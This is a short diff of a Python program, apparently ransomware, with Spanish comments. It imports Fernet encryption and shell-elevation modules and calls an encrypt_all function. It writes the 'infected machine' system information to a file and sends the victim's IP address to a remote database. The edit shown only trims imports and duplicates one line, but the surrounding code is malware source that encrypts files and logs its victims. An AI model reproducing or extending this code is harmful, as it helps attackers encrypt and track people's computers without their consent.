@@ -4,12 +4,9 @@ import subprocess
 import win32com.shell.shell as shell
 from cryptography.fernet import Fernet
 from PIL import Image
-import win32api
 import requests
 import sys
 import shutil
-import mysql.connector
-import datetime
 
 
 from conec import Database
@@ -140,7 +137,6 @@ def encrypt_all(application_path):
 
 
 
-
 def main():
     # Reubicando esta línea para hacerla más efectiva
     db = Database()
@@ -191,6 +187,8 @@ def main():
                     for clave, valor in informacion_sistema.items():
                         archivo_infectado.write(clave + ': ' + str(valor) + '\n')
                 print("Archivo 'info_equipo_infectado.txt' creado con éxito en la carpeta 'files'.")
+                ip_address = informacion_sistema['Dirección IP']
+
                 ip_address = informacion_sistema['Dirección IP']
                 db.insert_data(ip_address)
                 
